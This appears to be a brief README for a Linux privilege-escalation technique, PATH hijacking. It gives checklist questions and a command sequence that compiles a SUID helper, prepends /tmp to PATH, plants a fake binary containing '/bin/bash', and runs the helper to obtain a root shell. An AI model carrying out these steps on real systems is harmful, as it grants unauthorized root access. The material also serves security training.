# Example:

### echo $PATH

## Questions before using this privesc vector:

### 1: What folders are located under $PATH?

### 2: Does your current user have write privileges for any of these folders?

### 3: Can you modify $PATH?

### 4: Is there a script/app you can start that will be affected by this vulnerability?

### Example script is at root shells directory in this repository:

## Compilation: 

### gcc path_exp.c -o path -w

### chmod u+s path

### find / -writeable 2>/dev/null

### export PATH=/tmp:$PATH (Add tmp to PATH)

### cd /tmp

### echo "/bin/bash" > example

### chmod 777 example

### ./path
